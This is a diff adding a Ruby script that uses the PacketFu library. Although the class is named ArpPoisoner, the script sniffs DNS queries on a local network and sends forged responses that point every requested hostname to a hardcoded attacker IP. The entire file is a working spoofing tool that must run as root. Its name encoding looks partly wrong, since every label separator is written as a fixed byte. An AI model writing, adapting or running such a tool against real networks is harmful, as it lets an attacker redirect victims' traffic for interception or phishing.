@@ -1,0 +1,73 @@
+#!/usr/bin/env ruby
+# encoding: ascii-8bit
+#
+require 'packetfu'
+
+class ArpPoisoner
+  def initialize(args={})
+    @ip_address = args[:ip_address] || '127.0.0.1'
+    @iface = args[:iface] || ENV['IFACE'] || Pcap.lookupdev || 'lo'
+    @ip_cfg = PacketFu::Utils.whoami?(iface: @iface)
+    @filter = 'udp and port 53'
+    @options = { iface: @iface, promisc: true, start: true, filter: @filter}
+  end
+
+  def start
+    capture = PacketFu::Capture.new(@options)
+    loop do
+      capture.stream.each do |pkt|
+        packet = PacketFu::Packet.parse(pkt)
+        if packet.length > 0 and packet.payload.slice(2,2) == "\x01\x00" # dnsCount
+          i = 13
+          j = packet.payload.length - 18
+          q = i + j + 2 # Index for the query type
+          if packet.payload[q].to_s == "\x01"
+            dst_host = host_name(packet, i, j)
+            print_peek_format(packet, dst_host)
+            send_poisoned_packet(dst_host, packet)
+          end
+        end
+      end
+    end
+  end
+
+  def print_peek_format(pkt, dst_host)
+    print "SRC IP: %-15s DST IP: %-15s DNS Query: %s\n" % [pkt.ip_saddr.to_s, @ip_address, dst_host]
+  end
+
+  def host_name(packet, i, j)
+    packet.payload.codepoints.slice(i, j).pack('U*').tr((0..13).to_a.pack('C*'), '.')
+  end
+
+  def send_poisoned_packet(h, packet)
+    udp_pkt = PacketFu::UDPPacket.new
+    udp_pkt.eth_saddr = @ip_cfg[:eth_saddr]
+    udp_pkt.eth_daddr = packet.eth_saddr.to_s
+    udp_pkt.udp_src = "53"
+    udp_pkt.udp_dst = packet.udp_dst.to_i
+    udp_pkt.ip_saddr = @ip_cfg[:ip_saddr]
+    udp_pkt.ip_daddr = packet.ip_saddr.to_s
+    udp_pkt.payload = poisoned_payload(h, packet)
+    udp_pkt.recalc
+    udp_pkt.to_w(@iface)
+  end
+
+  def poisoned_payload(host, packet)
+    hostname = host.split(".").join("\x03") + "\x00"
+    hostname_len = [hostname.length].pack('C*')
+
+    packet.payload.slice(0,2) +
+      [0, 128, 0, 1, 0, 1, 0, 0, 0, 0].pack('C*') +
+      hostname_len + hostname +
+      [0, 0, 0, 1, 192, 12, 0, 1, 0, 1, 0, 19, 153, 0, 4].pack('C*') +
+      @ip_address.split('.').collect(&:to_i).pack("C*")
+  end
+end
+
+if !Process.euid.zero?
+  raise SecurityError, "You need to be root to run this"
+end
+
+@arp_poisoning = ArpPoisoner.new(iface: 'en1', ip_address: '192.168.0.198')
+@arp_poisoning.start
+
